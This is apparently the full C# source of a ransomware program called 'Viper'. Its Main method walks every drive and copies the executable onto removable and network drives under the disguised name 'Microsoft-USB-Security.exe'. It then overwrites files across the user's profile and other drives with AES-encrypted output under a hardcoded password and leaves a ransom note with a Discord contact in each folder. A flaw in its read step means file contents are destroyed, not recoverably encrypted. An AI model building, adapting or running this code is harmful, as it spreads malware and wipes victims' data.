using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace ConsoleApp1;

internal class Program
{
	private static string vrn = "[Ransomware.Viper.A]\n\nQ. 1> WhAt tHe HeCK HapPEneD To mY fIlES?!\n A > Your files were encrypted by Viper Ransomware with military grade encryption AES-256.\n There is no way to brute force it since quantum computers aren't that fast.\n\nQ. 2>How to get back my files?\nA > Add Maschinenpistole 40#6508 to your friends in https://discord.com and wait for instructions.\n\n**NOTE** VIPER WAS CREATED FOR FUN AND NO PAYMENT IS REQUIRED, JUST CONTACT ME AND I WILL SEND YOU THE DECRYPTER. **DO NOT MODIFY THE FILES YOU IDIOT!!**";

	private static void Main(string[] args)
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			DriveInfo[] array2 = array;
			foreach (DriveInfo driveInfo in array2)
			{
				if (driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network)
				{
					spread(driveInfo.Name.ToString());
				}
				if (driveInfo.Name.ToString() == "C:\\")
				{
					encryptAllDirectoryAndSubDirectoryFiles("C:\\Users\\" + Environment.UserName);
				}
				else
				{
					encryptAllDirectoryAndSubDirectoryFiles(driveInfo.Name.ToString());
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static string Encrypt(byte[] PlainText, byte[] Password, string Salt = "ViperKnight", string HashAlgorithm = "SHA1", int PasswordIterations = 2, string InitialVector = "OFRna73m*aze01xY", int KeySize = 256)
	{
		if (string.IsNullOrEmpty(PlainText.ToString()))
		{
			return "";
		}
		byte[] bytes = Encoding.ASCII.GetBytes(InitialVector);
		byte[] bytes2 = Encoding.ASCII.GetBytes(Salt);
		PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Password, bytes2, HashAlgorithm, PasswordIterations);
		byte[] bytes3 = passwordDeriveBytes.GetBytes(KeySize / 8);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.Mode = CipherMode.CBC;
		byte[] inArray = null;
		using (ICryptoTransform transform = rijndaelManaged.CreateEncryptor(bytes3, bytes))
		{
			using MemoryStream memoryStream = new MemoryStream();
			using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			cryptoStream.Write(PlainText, 0, PlainText.Length);
			cryptoStream.FlushFinalBlock();
			inArray = memoryStream.ToArray();
			memoryStream.Close();
			cryptoStream.Close();
		}
		rijndaelManaged.Clear();
		return Convert.ToBase64String(inArray);
	}

	private static void encrypt(string f)
	{
		try
		{
			string s = File.ReadAllLines(f).ToString();
			string s2 = cp();
			string s3 = Encrypt(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
			File.WriteAllBytes(f, Encoding.UTF8.GetBytes(s3));
		}
		catch (Exception)
		{
		}
	}

	private static string cp()
	{
		return "RansomwareViper";
	}

	private static void encryptAllDirectoryAndSubDirectoryFiles(string d)
	{
		try
		{
			if (d != "C:\\Users\\" + Environment.UserName + "\\AppData")
			{
				string[] files = Directory.GetFiles(d);
				for (int i = 0; i < files.Length; i++)
				{
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					encrypt(files[i]);
				}
				File.WriteAllText(d + "\\Viper_README.RW-SK.txt", vrn);
				string[] directories = Directory.GetDirectories(d);
				for (int j = 0; j < directories.Length; j++)
				{
					encryptAllDirectoryAndSubDirectoryFiles(directories[j]);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private static void spread(string dp)
	{
		try
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, dp + "Microsoft-USB-Security.exe");
		}
		catch
		{
		}
	}
}
